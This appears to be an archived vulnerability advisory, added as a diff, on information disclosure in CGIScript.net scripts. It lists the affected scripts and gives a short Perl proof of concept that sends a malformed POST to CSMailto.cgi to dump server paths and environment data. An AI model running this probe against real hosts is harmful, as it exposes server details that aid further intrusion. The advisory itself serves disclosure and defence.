@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/4764/info
+
+CGIScript.net provides various webmaster related tools and is maintained by Mike Barone and Andy Angrick.
+
+It is possible to cause numerous scripts provided by CGIScript.net to disclose sensitive system information.
+
+The following is a list of cgi scripts that are susceptible to this issue:
+
+csBanner.cgi
+csCreatePro.cgi
+CSDownload.cgi
+csFAQ.cgi
+CSFiler.cgi
+CSFileshare.cgi
+CSGrid.cgi
+CSIncludes.cgi
+CSMailto.cgi
+CSNews.cgi
+CSNews.cgi (pro version)
+CSRandomText.cgi
+CSUpload.cgi
+
+Path, form input, and environment variable information is disclosed when a malformed POST request is submitted. This information may aid the attacker in making further attacks against the host. 
+
+#!/usr/bin/perl
+# show_debug_data.pl
+# make cgiscript.net scripts dump debug data
+
+use strict;
+use IO::Socket::Inet;
+
+my $host = 'hostname.com';
+my $path = '/cgi-script/CSMailto/CSMailto.cgi';
+
+my $sock = IO::Socket::INET->new("$host:80");
+print $sock "POST $path\n";
+print $sock "Content-type: multipart/form-data;";
+print $sock " boundary=--\n\n";
+print <$sock>;
+close($sock);
